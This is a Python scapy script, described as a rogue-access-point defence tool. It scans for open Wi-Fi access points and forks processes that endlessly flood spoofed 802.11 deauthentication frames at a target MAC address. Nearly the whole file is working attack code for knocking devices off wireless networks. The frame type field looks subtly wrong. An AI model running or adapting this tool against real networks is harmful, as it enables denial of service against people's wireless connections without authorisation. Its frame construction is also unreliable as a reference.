from scapy.all import *
import argparse
import os
import subprocess
import time
import signal

# RadioTap    --> Provides additional information that is added to each 802.11 frame 
# Dot11       --> Creates 802.11 frame
# Dot11Deauth --> Creates deauth frame -- > type will be a management frame and the subtype will be a deauthentication frame
# sendp       --> Sends pkts

def deauth(dstn, srcc, inter=0.1, count=None, loop=1, iface="wlp3s0", verbose=1):
    print("Executing attack on",srcc,"\n----------------")
    # 802.11 frame
    # addr1: destination MAC address of the victim machine (broadcast)
    # addr2+addr3: source MAC, AP MAC address
    dot11 = Dot11(type=7, subtype=12,addr1=dstn, addr2=srcc, addr3=srcc) # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7) # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose) #send the packet we created via a specified arguments

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate.")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlp3s0'", default="wlp3s0")
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose
    if count == 0:        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0
    if verbose:
        if count:    # printing some info messages"
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")
            
            
    print("WELCOME TO DEAUTHENTICATION TOOL")
    pids=[]
    while True:
        c = 0        
        print("Scanning please wait ...")          
        pids=[]
        subprocess.call(['sh', './scan.sh'])#shell script to run iwlist scan command
        print("Done scanning")
        #time.sleep(2)  
        with open('result2.txt','r') as f: #file that contains the regex output of iwlist scan command
            lines = f.readlines()
        print("Scanned APs:",lines)
        for rap in lines:
           if "off" in rap: #check for ecnyption key : off (Open AP = Rouge AP = RAP)
               c += 1
               SAP=rap[1:18]
               n = os.fork()
               if n == 0: #child
                   rAP_num=c

                   #print("RAP number", c,"with MAC",SAP)
                   print("Child process succesfully created for RAP number",rAP_num,"\nMAC:",SAP,"  pid:", os.getpid())
                   deauth(target, SAP, interval, count, loop, iface, verbose)
                   print("killing",os.getpid(),"process")        
                   exit(0)
               else: #parent
                   pids.append(n)
                   time.sleep(2)
        if c == 0 :
            print("No Rouge AP found -- we seem to be SECURE ^^")
        print("--------------------------------------------\nRe-scanning -- after sleeep for 30s")
        #time.sleep(30)
        for k in range(30, 0, -1):
            print(k, end = ' \r')
            time.sleep(1)                   
            


    
    
    
   

